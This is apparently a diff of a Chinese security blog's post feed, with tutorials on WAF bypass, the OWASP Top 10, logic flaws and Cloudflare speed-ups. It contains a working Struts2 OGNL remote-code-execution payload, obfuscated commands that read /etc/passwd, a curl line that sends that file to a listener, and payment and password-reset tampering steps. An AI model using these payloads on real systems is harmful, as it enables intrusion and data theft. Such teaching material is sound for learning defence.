-<p>curl -v “<a href="http://127.0.0.1/shell.py%E2%80%9D">http://127.0.0.1/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p>
-<p>curl -v “<a href="http://127.0.0.1/shell.py%E2%80%9D">http://2130706433/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p>
-<p>使用 \ 符号来绕过WAF</p>
-<p>root@kali:~# c\a\t &#x2F;etc&#x2F;passwd</p>
-<p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p>
-<p>daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</p>
-<p>games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>使用 \ 符号加回车来绕过WAF</p>
-<p>root@kali:~# c\</p>
-<p>&gt; at &#x2F;e’t’c&#x2F;p”a’s’swd</p>
-<p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p>
-<p>daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
-<p>sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</p>
-<p>使用curl -d参数读取本地文件</p>
-<p>curl -d @&#x2F;<file> <remote server></p>
-<p>例如</p>
-<p>curl -d @&#x2F;etc&#x2F;passwd 127.0.0.1:8888</p>
-<p># 在本地侦听8888端口即可接受到数据</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-27.png" alt="图片"></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 端口 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>OWASP TOP 10漏洞介绍</title>
+      <link href="/2023/07/21/OWASP-TOP-10%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/"/>
+      <url>/2023/07/21/OWASP-TOP-10%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>OWASP项目最具权威的就是其“十大安全漏洞列表”,这个列表总结了Web应用程序最可能、最常见、最危险的十大漏洞</p><span id="more"></span><p>跨站脚本漏洞</p><ul><li><p>漏洞原理：</p><ul><li>（1）持久型跨站：最直接的危害类型，跨站代码存储在服务器（数据库）。</li><li>（2）非持久型跨站：反射型跨站脚本漏洞，最普遍的类型。用户访问服务器-跨站链接-返回跨站代码。</li><li>（3）DOM跨站（DOM XSS）:DOM(document object model文档对象模型)，客户端脚本处理逻辑导致的安全问题。</li></ul></li><li><p>漏洞靶场：</p></li></ul><p><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file.jpeg" alt="图片"></p><p>当我们访问这个页面时，我们的ＰＣ就在攻击者的beef中上线了<br><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-1.jpeg" alt="图片"></p><p>通过 beef，我们可以对上线的浏览器进行很多的后门操作比如最基本的弹窗：<br><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-2.jpeg" alt="图片"></p><ul><li>漏洞实战演练：<a href="http://www.alliedjeep.com/87508.htm">http://www.alliedjeep.com/87508.htm</a> couponPHP CMS 1.0跨站脚本漏洞 couponPHP是优惠劵和交易网站的内容管理系统。 couponPHP CMS 1.0版本没有正确过滤 &#x2F;admin&#x2F;ajax&#x2F;comments_paginate.php 或 &#x2F;admin&#x2F;ajax&#x2F;stores_paginate.php的 “sEcho” GET 参数值，在实现上存在多个跨站脚本漏洞，可导致在用户浏览器会话中执行任意HTML和脚本代码。</li><li>个人总结：以存储型跨站为例，我们在用户的页面输入的语句会存入到系统的数据库中，这样，当其他用户访问我们存入的信息时就造成了存储型跨站的攻击，图片为我定入的存储型跨站的利用是js。</li></ul><p>Sql注入漏洞</p><ul><li>漏洞原理：SQL注入攻击是黑客对数据库进行攻击的常用手段之一。随着B&#x2F;S模式应用开发的发展，使用这种模式编写应用程序的程序员也越来越多。但是由于程序员的水平及经验也参差不齐，相当大一部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的SQL Injection，即SQL注入。</li><li>漏洞靶场：在我们的靶场中我们会了解查询到底是怎么一回事，数据是怎么样传入的</li></ul><p><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-3.jpeg" alt="图片"></p><p>上面两个图片，是数据以get及post方式发送的代码内容，我们的参数就是以这种形式发送的。而后台接收后的样子类似是这样的 Select * from (xxx数据表) where what&#x3D;(‘id’) id为你输入的参数，而sql注入就是在这个语句后面加入攻击者自己构造的语句，使数据库查询出我们想要的数据并给前台一定的提示。 并会在我们的靶场中进行攻击学习.<br><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-4.jpeg" alt="图片"></p><p>漏洞实战演练：<a href="http://www.cnblogs.com/moqiang02/p/4061399.html">http://www.cnblogs.com/moqiang02/p/4061399.html</a></p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-5.jpeg" alt="图片"></p><ul><li><p>个人总结：sql注入仍然是被利用最多的漏洞，他的危害程度和利用范围也是其他漏洞不可以比的，而且逐渐开始工具化，手工注入越来越少，虽然难度大的注入漏洞几乎只能用手工去做，但一点也不影响工具的推广和利用，比较常用的攻击工具sqlmap，可以实现大量的绕过和注入方法。当然，因为他的功能越来越强大，使用的方法也越来越复杂，有的注入点，有可能同样是用sqlmap，小白就注入不进去，可是有的老手就可以通过对语句和参数的修改注入成功。 当然有很多的注入点也需要自己手工去写一些脚本去进行测试，因为盲注这一形式的存在，给手工注入带来了巨大的麻烦，图片为我自己编写的盲注的小脚本，可以利用注入去暴力猜出用户的密码。<br><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-6.jpeg" alt="图片"></p></li><li><p>POC框架</p><ul><li>基于原生POC编写练习</li><li>基于框架POC编写练习</li></ul></li></ul><p>越权漏洞</p><ul><li><p>漏洞原理：是指超越权限或权力范围的意思。越权漏洞是Web应用程序中一种常见的安全漏洞。它的威胁在于一个账户即可控制全站用户数据。当然这些数据仅限于存在漏洞功能对应的数据。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。所以测试越权就是和开发人员拼细心的过程。</p></li><li><p>漏洞靶场：针对网站的权限绕过，后期会带大家搭建相对环境学习<br><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-7.jpeg" alt="图片"></p></li><li><p>漏洞实战演练：</p><p><a href="https://loudong.sjtu.edu.cn/show/CNVD-2017-04015">https://loudong.sjtu.edu.cn/show/CNVD-2017-04015</a></p><p>　齐博CMS整站系统V7.0存在越权访问漏洞 个人总结：对于越权漏洞的主要挖掘方法：</p><ul><li><ul><li>测试越权一般得有俩号。</li><li>对userid。orderid等等ID要敏感，一旦发现，就多测测。</li><li>某些厂商喜欢用纯数字的MD5作为用户的cookie，多注意发现。</li><li>多使用抓包工具，多分析数据包，多修改数据包。</li><li>多站在开发的角度去分析网站哪儿存在越权。</li><li>多看看别人的漏洞 越权漏洞属于逻辑漏洞，这样的漏洞，不是代码的硬性错误，网站可以说他没有sql注入漏洞，但他不可以说他没有逻辑漏洞，只是每个人的思考方向不同，测试方法和角度也不一样，发现的逻辑漏洞也就不会相同。</li></ul></li></ul></li></ul><p>目录漏洞</p><ul><li>漏洞原理：该漏洞旨在访问储存在Web根文件外的文件或者目录。主要分为以下两种 目录列表漏洞：用户访问网站目录地址时，能看到目录下所有文件列表，导致网站目录结构暴露，重要的敏感数据泄露。目录遍历漏洞：程序没有充分过滤用户输入的..&#x2F;之类的目录跳转符，导致用户可以通过提交目录跳转来遍历服务器上的任意文件。使用多个..符号，不断向上跳转，最终停留在根&#x2F;，通过绝对路径去读取任意文件。</li><li>漏洞靶场：简单的网站框架就可以实现相应漏洞，在我们的靶场中会集成本漏洞</li><li>漏洞实战演练：<a href="http://sec.sangfor.com.cn/vulns/236.html">http://sec.sangfor.com.cn/vulns/236.html</a>　 Pligg CMS 2.0.2 目录遍历漏洞<br><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-8.jpeg" alt="图片"></li><li>个人总结：其实在目录漏洞需要配合其他的漏洞进行组合攻击，单独目录漏洞的危害性并不大，但他的可利用程度确很高，当存在其他的漏洞时，这个漏洞就可以帮助我们获取到更多的权限。</li></ul><p>文件包含漏洞</p><ul><li>漏洞原理：程序开发人员通常会把要重复使用的函数写到单个文件中，在使用某个函数时直接在文件里面调用此函数无需再次编写。</li><li>文件包含有两种： 本地文件包含配合本地的文件遍历漏洞，可以执行任意文件代码</li><li>远程文件包含 ：即加载远程文件，在php.ini中开启allow_url_include、allow_url_fopen选项。开启后可以直接执行任意代码。配合本地的文件遍历漏洞，可以执行任意文件代码</li><li>漏洞靶场：靶场为jsp语言，会带领大家搭建相对应的文件包含环境，但不存在靶场中</li><li>漏洞实战演练：<a href="http://www.xuebuyuan.com/1062689.html">http://www.xuebuyuan.com/1062689.html</a>　 Phpcms 2007 远程文件包含漏洞</li><li>个人总结：执行任意代码，包含恶意文件控制网站甚至控制服务器，这个漏洞的危害是巨大的，但他主要存在于ＰＨＰ的环境中。对环境的依赖程度也相对要高，确相对好整改，只要限制好目录的权限，这个漏洞可以造成的影响并不大。</li></ul><p>命令执行漏洞</p><ul><li>漏洞原理：用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</li><li>漏洞靶场：<br><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-9.jpeg" alt="图片"></li><li>漏洞实战演练：网上随处可见的struts2网站，只要是没有升级或打上补丁的，都会存在问题</li><li>个人总结：最常见的命令执行漏洞就是struts2漏洞了，当然，还有weblogic等等，今天主要给大家分享struts2的相关知识 Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开，所以Struts 2可以理解为WebWork的更新产品。虽然从Struts 1到Struts 2有着太大的变化，但是相对于WebWork，Struts 2的变化很小。 对应ＰＯＣ： [“Content-Type”]&#x3D;”%{(#nike&#x3D;’multipart&#x2F;form-data’).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;’ifconfig’).(#iswin&#x3D;(@java.lang.System@getProperty(‘os.name’).toLowerCase().contains(‘win’))).(#cmds&#x3D;(#iswin?{‘cmd.exe’,’&#x2F;c’,#cmd}:{‘&#x2F;bin&#x2F;bash’,’-c’,#cmd})).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}” 简单的利用方法</li></ul><p>弱口令漏洞</p><ul><li>漏洞原理：就是说由常用数字、字母、字符等组合成的，容易被别人通过简单及平常的思维方式就能猜到的密码，利用弱口令结合计算机系统等漏洞可以做到入侵的事半功倍的效果 主要的探测方法为测试验证码的功能，如果目标站的验证机制不完善，或存在逻辑漏洞，则可以利用该漏洞进行暴力破解攻击，结合社工的结果进行测试，如果用户存在弱口令漏洞，就会被攻击方加以利用，伪装成普通用户的权限进行登录，扩大攻击者的权限范畴，增加网站的风限程度</li><li>漏洞靶场：靶场的登录处就是这个漏洞 漏洞实战演练：本漏洞主要成因是人为的，需要手工去寻找。</li><li>个人总结：只要做好社工，基本上网站全是弱口令，这是某个大神说的。我觉的非常的有道理。希望大家各级去尝试。</li></ul><p>文件上传漏洞</p><ul><li><p>漏洞原理：在于代码作者没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。</p></li><li><p>漏洞靶场： </p><p><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-11.jpeg" alt="图片"></p></li><li><p>漏洞实战演练：<a href="https://www.lvtao.net/shell/phpcms-upload-webshell.html">https://www.lvtao.net/shell/phpcms-upload-webshell.html</a>　 phpcms前台头像上传漏洞导致webshell详解及案例</p></li><li><p>个人总结：这个漏洞被黑客们利用的最为猖獗，利用上传漏洞可以直接得到WEBSHELL，危害等级超级高，现在的入侵中上传漏洞也是常见的漏洞。 主要是上传木马文件及反弹工具等，在网络上现在也存在这各种防护方法，具体的绕过我们就不讲了，主要分享一下，上传的东西，与方法。 上传webshell，按语言主要分为三种php,asp,jsp其他衍生的类型不计其数，但核心仍是这三种，主要目的就是通过webshell，对网站进行控制。</p></li></ul><p>漏洞利用</p><ul><li>目的：我们整个攻击行为的目的，比如获取flag,目标服务器权限等等，根据我们不同的目的，我们要做出不同的针对性的攻击，可以大大节省我的时间和资源。 隐藏：在攻击的过程中，我们要学会隐藏自己，把我们的攻击行为隐藏起来，这样我们就可以保证我们在攻击的过程中不会被发现，导致我们的攻击过程被强行中断，减少不必要的工作量。</li><li>特定场景的针对测试：每一个目标的环境就行人一样，都是维一的，没有一模一样的环境，所以我们要针对不同的环境去做不同的攻击，减少没必要的行为。</li></ul><p>权限提升</p><p>当我们拿到webshell后，我们要做的就是权限提升了，我们真正开接触到我们的目标了现在。</p><ul><li><p>内部信息收集：</p><ul><li>根据我们的目标，我们要开始收拾信息，网站的基本信息，管理者的行为信息，目标的内部环境等，我们有了一个跳板就要把我们可以拿到的点都拿到手中，这样才可以保证我们的目的达成。</li></ul></li><li><p>系统漏洞利用：</p><ul><li>我们的主要方法是溢出漏洞，当然也存在其他的提权方法，但在这节课中不涉及那些高级的应用了。在溢出漏洞中，我们首先要通过我们收集到的信息来确定我们可以利用的漏洞有可能有那些，如果运气好，我们的漏洞有可以利用的那直接利用已有的角本，我们可以直接拿到服务器的权限了，如果不能，那就要去一点点的测试，看看这个系统上安装了什么软件，然后去寻找一个可以让我们利用的溢出点，能过编写这个脚本来进行提权。比较常见的提权脚本有：<br><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-12.jpeg" alt="图片"></li></ul></li></ul><p>当然，还有很多很多，我就不一一展示了，还有一部分要涉及到密码的寻找，如果，我们没有办法溢出，那我们就要想办法找到高级管理员的密码，来登录到高权限的帐户上去<br><img src="https://cdn.alone-hk.cn/blog/images/post/img//uploads/2022/08/unnamed-file-13.jpeg" alt="图片"></p>]]></content>
+      
+      
       <categories>
-        <category>安全</category>
+          
+          <category> 安全 </category>
+          
       </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>实战-深度解析逻辑漏洞原理</title>
-    <url>/2023/07/22/%E5%AE%9E%E6%88%98-%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>0x01 登陆处 0x02 密码找回 0x03 支付 0x04 越权</p>
-<span id="more"></span>
-
-<p>0x01 登陆处（不局限登陆，例如下文的短信轰炸等）</p>
-<p>登陆时，是否可以绕过验证码形成撞库</p>
-<ul>
-<li>返回包中有验证码</li>
-<li>返回页面 hidden中有验证码</li>
-<li>有些其他登陆url中不需要验证码 (app 微信 测试url)</li>
-<li>验证码不变，验证码没有一个完整的服务请求，只在刷新url时才变(例如，cookie与验证码绑定，不刷新则不变)</li>
-<li>第一次请求包验证了验证码是否正确，第二次请求不需要验证</li>
-<li>拦截登录时验证码的刷新请求，第一次验证码未失效，可绕过</li>
-<li>验证码和用户名、密码是否一次同时提交</li>
-<li>万能验证码 如000000</li>
-<li>删除验证码参数或者Cookie中的一些值</li>
-<li>利用漏洞中验证码绕过的小技巧</li>
-</ul>
-<p>简单验证码ocr识别</p>
-<p>交给三方打码平台</p>
-<p>邮箱轰炸，短信轰炸，burp Repeate，短信轰炸验证码有60秒限制时，有的参数修改后可绕过</p>
-<p>isVerfi参数 这里是1 回包 3 手机没收到信息 存在验证码限制</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-2.jpg" alt="图片"></p>
-<p>改为0 回显2 绕过了验证码限制</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-3.jpg" alt="图片"></p>
-<p>枚举注册用户 输入用户名，发送请求验证用户名是否正确(若返回次数限制,可测试服务端未限制高频访问)</p>
-<p>登陆失败有次数限制,若包中有限制参数可更改或删除参数</p>
-<p>cookie简单可猜测</p>
-<p>cookie一直有效，（修改密码后）</p>
-<p>第三方账户登录绕过(拦截微博授权成功的请求地址： <a href="https://api.weibo.com/oauth2/sso_authorize?sflag=1">https://api.weibo.com/oauth2/sso_authorize?sflag=1</a> 修改response中uid，服务端没有校验客户端提交的uid与授权成功的uid相同)</p>
-<p>手势登陆某app，修改登陆参数ID，因为手势密码设置一般为常见密码可参见twitter上常见十种手势密码，组成字典枚举即可登陆大部分设置手势密码登陆账号(后端未正确校验)</p>
-<p>0x02 密码找回</p>
-<ul>
-<li>验证码回传</li>
-<li>验证码时间长，不失效可爆破（字典可去除全1重复数多的）</li>
-<li>修改密码，修改发送手机号修改为自己可控，[<a href="http://www.freebuf.com/articles/database/161495.html]">http://www.freebuf.com/articles/database/161495.html]</a></li>
-<li>验证码未绑定 只验证验证码正确，没判断用户id 或手机号，修改想改的id 正确手机验证码即可</li>
-<li>验证码 手机 用户未统一验证</li>
-<li>邮箱验证可猜测(<a href="https://www.secpulse.com/archives/9608.html">https://www.secpulse.com/archives/9608.html</a>)</li>
-<li>假如找回需要4部，最后一部有user参数，用自己账号正常到第三部，第四部修改user实现</li>
-</ul>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-7.png" alt="图片"></p>
-<ul>
-<li>可以跳步找回（直接访问页面）</li>
-<li>本地验证，修改返回值</li>
-<li>本地验证，返回未设置cookie，替换成功验证返回包</li>
-<li>服务器验证为空，包中直接删除验证码</li>
-<li>个别验证码全0可绕过</li>
-</ul>
-<p>token生成可控（wooyun两篇实例） <a href="http://cb.drops.wiki/bugs/wooyun-2014-058210.html">http://cb.drops.wiki/bugs/wooyun-2014-058210.html</a></p>
-<ul>
-<li><a href="http://cb.drops.wiki/bugs/wooyun-2015-094242.html">http://cb.drops.wiki/bugs/wooyun-2015-094242.html</a> <a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=31203&ctid=48">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=31203&amp;ctid=48</a></li>
-<li>cookie覆盖</li>
-</ul>
-<p>两个手机号</p>
-<p>第一个手机</p>
-<p>正常 忘记密码 到第三步</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-8.png" alt="图片"></p>
-<p>在同一浏览器下 第二手机号 忘记密码 提交到第二部</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-9.png" alt="图片"></p>
-<p>刷新 第一个手机的第三部时可 发现 用户名变为第二个手机</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-10.png" alt="图片"></p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-11.png" alt="图片"></p>
-<p>另一种示例</p>
-<p>两种密码重置之综合利用</p>
-<ul>
-<li>邮箱同上</li>
-<li>各种参数fuzz</li>
-</ul>
-<p>0x03 支付</p>
-<ul>
-<li>金额运费修改</li>
-</ul>
-<p>POST &#x2F;iflight&#x2F;submitorder.html HTTP&#x2F;1.1</p>
-<p>Host: wx.17u.cn</p>
-<p>Accept: application&#x2F;json</p>
-<p>X-Requested-With: XMLHttpRequest</p>
-<p>Accept-Encoding: gzip, deflate</p>
-<p>Accept-Language: zh-cn</p>
-<p>Content-Type: application&#x2F;x-www-form-urlencoded</p>
-<p>Origin: <a href="http://wx.17u.cn/">http://wx.17u.cn</a></p>
-<p>Content-Length: 780</p>
-<p>Connetion: keep-alive</p>
-<p>User-Agent: Mozilla&#x2F;5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X) AppleWebKit&#x2F;600.1.4 (KHTML, like Gecko) Mobile&#x2F;12B436 MicroMessenger&#x2F;6.3.13 NetType&#x2F;3G+ Language&#x2F;zh_CN</p>
-<p>Referer: <a href="http://wx.17u.cn/iflight/book2.html?showwxpaytitle=1&guid=0e1d1663-803f-4f0d-962c-6efdd953bfb0&pname=%E4%BC%98%E9%80%89%E7%BB%8F%E6%B5%8E%E8%88%B1&openId=oOCyauK2742VyO4lLB7MR9KyZ21o">http://wx.17u.cn/iflight/book2.html?showwxpaytitle=1&guid=0e1d1663-803f-4f0d-962c-6efdd953bfb0&pname=%E4%BC%98%E9%80%89%E7%BB%8F%E6%B5%8E%E8%88%B1&openId=oOCyauK2742VyO4lLB7MR9KyZ21o</a></p>
-<p>req&#x3D;%7B%22sg%22%3A%220e1d1663-803f-4f0d-962c-6efdd953bfb0%22%2C</p>
-<p>%22opass%22%3A%5B%7B%22ln%22%</p>
-<p>修改bxprice，可改成任意负数金额</p>
-<ul>
-<li>改id 给自己转账 红包</li>
-<li>数量</li>
-<li>请求重放，多次下单</li>
-</ul>
-<p>mysql多线程并发，条件竞争 （数据库操作加锁）</p>
-<ul>
-<li><a href="https://threathunter.org/topic/5942363d44a81b6215130e29">https://threathunter.org/topic/5942363d44a81b6215130e29</a> <a href="http://60.205.228.7/?p=278">http://60.205.228.7/?p=278</a></li>
-<li>参数污染 请求没该参数，却返回该参数，可请求该参数污染返回值 <img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-12.png" alt="图片"> <img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-13.png" alt="图片"></li>
-</ul>
-<p>实例 <a href="https://threathunter.org/topic/593ff6bc9c58e020408a79d4">https://threathunter.org/topic/593ff6bc9c58e020408a79d4</a></p>
-<p>0x04 越权</p>
-<ul>
-<li>改识别用户参数</li>
-<li>改cookie</li>
-<li>越权访问</li>
-<li>登陆后，修改密码 未校验id与用户 修改id 即可该其他人密码</li>
-<li>修改个人数据时 页面源代码有用户标识符id 抓包修改或添加id</li>
-<li>直接访问后台链接禁用js则不会跳转登录界面，直接登陆</li>
-<li>登陆分为账号和游客登陆，游客功能有限，app端只前端检测，模拟发包即可</li>
-</ul>
-<p>乌云drops – 小川 我的越权之道</p>
-<p><a href="http://static.hx99.net/static/drops/tips-727.html">http://static.hx99.net/static/drops/tips-727.html</a></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>提高Cloudflare站点在中国的体验</title>
+      <link href="/2023/07/21/%E6%8F%90%E9%AB%98Cloudflare%E7%AB%99%E7%82%B9%E5%9C%A8%E4%B8%AD%E5%9B%BD%E7%9A%84%E4%BD%93%E9%AA%8C/"/>
+      <url>/2023/07/21/%E6%8F%90%E9%AB%98Cloudflare%E7%AB%99%E7%82%B9%E5%9C%A8%E4%B8%AD%E5%9B%BD%E7%9A%84%E4%BD%93%E9%AA%8C/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>中国对Cloudflare网络的速度会有很大程度的劣化，所以在上面的网站访问速度也会非常烂</p><span id="more"></span><p>从此，Cloudflare不再是减速CDN了</p><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>众所周知，因为很多人用Cloudflare当作梯子中转之类的原因，中国对Cloudflare网络的速度会有很大程度的劣化，所以在上面的网站访问速度也会非常烂。最近我发现了一个不错的办法可以在一定程度上避免这个问题，所以今天就来说一说。</p><h1 id="普通用户的解决方法"><a href="#普通用户的解决方法" class="headerlink" title="普通用户的解决方法"></a>普通用户的解决方法</h1><p>对于网站的访问者来说，使用<a href="https://github.com/XIU2/CloudflareSpeedTest">CloudflareSpeedTest</a>这个工具就挺不错的，它能检测到当前网络连哪个IP是最好的。因为Cloudflare网络用的是Anycast，无论从哪个IP进入都可以，所以用这个检测出来的IP直接改Hosts访问就能解决访问网站慢的问题。<br>不过有些地区可能是服务商主动对Cloudflare的IP段进行限速，那这样有可能测试出来没有可以使用的节点，那么还有一种方法，网络上有些可能是企业之类的人会反代Cloudflare的网站用于解决在国内访问慢的问题，并且没有对host头做限制，那么这些第三方的节点同样也可以作为访问Cloudflare网站的方法。具体怎么找到这样的IP有一个<a href="https://github.com/ip-scanner/cloudflare">仓库</a>每天都会扫描全网去找像这样的节点。<br>当然这些节点也不是所有的IP从中国连接速度都很好，这时候可以把这个仓库的所有IP收集起来然后再丢给CloudflareSpeedTest去测试，具体我写了个简单的脚本来处理：</p><pre><code>git clone https://github.com/ip-scanner/cloudflare.gitcat cloudflare/*.txt &gt; proxy.txt./CloudflareST -allip -sl 0.1 -f proxy.txt -n 500</code></pre><p>这样获得的第三方IP就基本上不会被限速，里面甚至有可能有通过IPLC或者IEPL的节点，包括拿来当梯子中转速度都几乎可以跑满带宽，另外还有一个优点是这样Cloudflare获得的IP就是第三方节点的IP，可以起到匿名的作用。</p><h1 id="对于站长的解决方法"><a href="#对于站长的解决方法" class="headerlink" title="对于站长的解决方法"></a>对于站长的解决方法</h1><p>上面的方法相当于是用户自己去解决访问的问题，但是操作可能还是会有点复杂，所以对于网站站长来说不可能去期待访客通过这种方法来提高访问自己网站的速度。不过Cloudflare网站接入只能通过NS方式接入，这样接入的话域名解析的IP就是自动分配的，没办法自己设定解析，也就不能选择更合适的IP，另外之前用CF Partner通过CNAME接入的方法基本上都全死光了，那现在应该怎么办呢？后来我搜了一下，Cloudflare原来已经提供了官方通过CNAME接入的方法（应该是新加的功能），除了要绑信用卡之外就没别的要求了。<br>在使用这个功能之前，必须先有2个域名，一个是不重要的域名，通过NS方式接入Cloudflare，另一个是主要使用的域名，可以接到Cloudflare上，也可以接到别的NS服务商上。然后在那个不重要的域名中先设定好源站的解析，可以解析到“@”或者随便一个二级域名也可以，并且打开代理。然后点开SSL&#x2F;TLS-&gt;自定义主机名，第一次使用需要绑定信用卡或者PayPal，好像是因为它是个什么预付费的项目，免费100个CNAME，超过100个每个0.1USD。打开以后在回退源中输入刚刚设置好解析的那个域名，当回退源状态显示有效后就可以添加自定义主机名了。这里添加的主机名就是主要使用的域名，输入后根据提示在主域名上设定好TXT记录，完成后只要看到刚刚设定的主机名后面跟了两个有效就可以了。<br>这样准备工作就做完了，现在只要把主域名的解析设定到Cloudflare网络的任意节点，它就会自动连接到不重要的域名所解析的IP上。至于怎么获得优秀的IP，就可以像普通用户那样操作了，获得优秀的IP以后我们就可以设定一个A记录解析过去。<br>不过这里需要注意一些地方，如果使用的优选IP是Cloudflare官方的IP，那基本上也不会有什么问题，只是这个IP可能有些地区还是会访问缓慢，毕竟它也算是在重点关注对象中。如果是选择第三方节点IP，大多数情况速度都能保障，但是有个很大的问题就是那些节点的主人如果发现了你在使用他们的节点，他们是可以很轻易的进行中间人攻击的，毕竟域名都解析过去了，整个SSL证书也很简单，为了能避免这个问题一定要开启“证书透明度监视”保证能在第一时间避免有人进行中间人攻击。另外还有一个问题就是既然第三方IP可以匿名，那么网站也没办法获取到用户的真实IP地址了，像Cloudflare一些根据IP的防火墙也会无法生效，像WAF中的速率限制规则是万万不能开的，开了很大可能网站就访问不了了。还有就是DDoS是可以击垮第三方节点的，可能会使网站的可用性下降。所以如果对速度没有特别在意的情况下还是解析到官方IP上更好一些。<br>所以为了避免节点可能会用不了的情况，我有个想法（因为我没有大陆地区的服务器所以只是设想），之前我用过一个可以给Cloudflare设定DDNS的脚本，叫<a 